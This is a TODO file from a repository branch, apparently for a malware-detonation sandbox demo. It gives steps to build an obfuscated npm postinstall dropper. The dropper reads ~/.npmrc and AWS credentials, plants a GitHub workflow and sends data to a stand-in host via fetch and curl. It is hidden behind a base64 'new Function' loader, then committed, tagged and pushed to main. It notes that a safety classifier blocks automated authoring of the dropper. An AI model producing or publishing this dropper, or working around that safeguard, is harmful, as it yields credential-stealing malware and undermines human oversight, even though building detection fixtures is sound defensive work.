# v1.2.4 — finish the fixture (C)

This branch (`v1.2.4-prep`) is a working v1.2.4 with a **benign placeholder** `setup.js`. To make it the
BLOCKED fixture the demo needs, generate the real dropper and tag it. The safety classifier requires a
human to author the obfuscated dropper, which is why it is not committed here.

## Steps

1. Author the readable payload as a CommonJS **function body** (the six behaviours are documented in the
   Detonation Chamber repo at `demo/fixture-payload.md`): interlock on `CHAMBER_LAB==='1' && CI==='true'`,
   read decoy env + `~/.npmrc` + `~/.aws/credentials`, plant `${INIT_CWD}/.github/workflows/color-helper-sync.yml`,
   `fetch()` then `curl` to `https://collector.color-helper.invalid/c`, swallow errors.
2. Base64-encode it and overwrite `scripts/setup.js` with the one obfuscated line:
   `try { new Function("require", Buffer.from("<b64>","base64").toString("utf8"))(require); } catch(e){}`
   then `process.exit(0);`
3. Sanity-check it parses: `node -e "new Function('require', Buffer.from('<b64>','base64').toString())"`.
4. `git add -A && git commit -m "feat: simulated malicious postinstall (v1.2.4 fixture)"`
5. Merge to main and tag:
   `git checkout main && git merge --ff-only v1.2.4-prep && git tag v1.2.4 && git push origin main v1.2.4`

## Verify (in the sandbox, via B's chamber)

`chamber detonate` on tiny-slugify's color-helper bump should return **BLOCKED** with ≥ 3 critical findings
(`HONEYTOKEN_READ`, `TAMPER`, `DECOY_EXFIL`, `EXFIL_ATTEMPT`, `SHIM_INVOKED`). Delete this TODO file before tagging.
